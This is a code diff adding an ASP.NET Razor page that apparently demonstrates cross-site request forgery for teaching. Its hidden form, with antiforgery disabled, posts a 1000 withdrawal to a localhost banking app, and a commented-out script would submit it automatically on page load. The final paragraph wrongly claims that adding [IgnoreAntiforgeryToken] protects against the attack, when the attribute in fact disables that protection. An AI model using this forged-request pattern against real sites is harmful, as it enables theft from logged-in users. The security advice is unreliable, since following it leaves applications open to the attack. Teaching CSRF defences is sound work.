@@ -1,0 +1,25 @@
+﻿@page
+@model IndexModel
+@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h2>This page automatically posts to the Withdraw form in the Banking application</h2>
+<p>If you are logged in to the banking application (and it's running) then clicking the button below will steal money from your account</p>
+<p>It's easy to automatically click the button too using a simple bit of javascript <code>document.forms[0].submit();</code></p>
+
+<form action="https://localhost:55555/balance" method="POST" asp-antiforgery="false">
+    <input type="hidden" name="amount" value="1000" />
+    <button type="submit" class="btn btn-warning">Steal your money</button>
+</form>
+
+@* Uncomment this to have the form be automatically submitted
+    <script>
+        document.forms[0].submit();
+    </script>
+*@
+
+<p>
+    By default, you're protected with Razor Pages. If you add <code>[IgnoreAntiforgeryToken]</code> to the <code>Balance.cshtml</code> Razor Page, you can protect against this attack.
+    The form on this site can't generate a valid token, so the form post will be rejected with a 400 Bad Request.
+</p>
